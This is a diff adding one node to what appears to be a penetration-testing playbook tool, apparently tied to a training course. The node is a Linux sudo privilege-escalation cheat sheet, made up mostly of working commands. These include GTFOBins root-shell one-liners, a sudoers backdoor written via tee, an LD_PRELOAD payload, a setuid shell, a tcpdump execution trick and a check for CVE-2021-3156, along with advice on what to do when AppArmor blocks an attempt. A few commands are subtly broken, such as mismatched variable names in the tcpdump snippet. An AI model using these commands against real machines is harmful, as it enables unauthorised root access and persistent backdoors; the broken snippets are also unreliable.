@@ -1,0 +1,22 @@
+{
+  "id": "sudo_check",
+  "phase": "LINUX",
+  "title": "Sudo Exploitation",
+  "body": "Module 18.4.2: sudo -l shows what you can run as root. Cross-ref with GTFOBins. Watch for AppArmor blocking — check /var/log/syslog if exploit fails.",
+  "cmd": "# ── CHECK SUDO PERMISSIONS ───────────────────────────\nsudo -l\n# Key patterns:\n# (ALL : ALL) ALL              = full root — sudo -i or sudo su\n# (ALL) NOPASSWD: /usr/bin/vim = run vim as root no password\n# (root) /usr/bin/apt-get      = specific command\n\n# ── FULL SUDO — INSTANT ROOT ──────────────────────────\nsudo -i\nsudo su\nsudo /bin/bash\nsudo -s\n\n# ── COMMON GTFOBINS SUDO ONE-LINERS ──────────────────\n# vim\nsudo vim -c ':!/bin/bash'\nsudo vim -c ':py import os; os.system(\"/bin/bash\")'\n\n# nano\nsudo nano\n# Inside nano: Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0\n\n# find\nsudo find . -exec /bin/sh ; -quit\n\n# python3\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'\n\n# less\nsudo less /etc/passwd\n# Inside less: !/bin/bash\n\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# apt-get (Module 18.4.2 example)\nsudo apt-get changelog apt\n# Inside less/pager: !/bin/sh\n\n# tcpdump (Module 18.4.2 — may be blocked by AppArmor)\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $tf\nchmod +x $tf\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tf -Z root\n\n# env\nsudo env /bin/bash\n\n# tee — write to root files\necho \"user ALL=(ALL) NOPASSWD: ALL\" | sudo tee -a /etc/sudoers\n\n# ── APPARMOR — IF EXPLOIT BLOCKED ────────────────────\n# Module 18.4.2: AppArmor can block sudo exploits\ncat /var/log/syslog | grep \"DENIED\"\n# apparmor=\"DENIED\" = AppArmor blocked it\n# Check status:\nsudo aa-status 2>/dev/null\n\n# ── SUDO WITH ENV VARS ────────────────────────────────\n# If env_keep is set (LD_PRELOAD etc)\nsudo -l | grep env_keep\n# LD_PRELOAD trick:\n# cat > /tmp/pe.c << EOF\n# #include <stdio.h>\n# #include <stdlib.h>\n# void _init() { setuid(0); system(\"/bin/bash\"); }\n# EOF\ngcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c\nsudo LD_PRELOAD=/tmp/pe.so <allowed_command>\n\n# ── GCC (sudo) ────────────────────────────────────────\n# sudo -l shows: /usr/bin/gcc\nsudo gcc -wrapper /bin/bash,-s -o /dev/null /dev/null\n# instant root shell\n\n# Alternative — compile setuid shell:\necho 'int main(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/sh.c\nsudo gcc /tmp/sh.c -o /tmp/sh\n/tmp/sh\n\n# ── SUDO VERSION EXPLOIT ──────────────────────────────\n# Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2)\nsudo --version\nsudoedit -s / 2>&1 | grep -i \"usage\"\n# If \"usage\" = vulnerable",
+  "warn": "If tcpdump or other exploit is blocked, check /var/log/syslog for AppArmor DENIED. AppArmor profiles restrict what processes can do even with sudo. Try a different command from sudo -l.",
+  "choices": [
+    {
+      "label": "Got root shell via sudo",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "sudo blocked by AppArmor — try another cmd",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Back to full enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
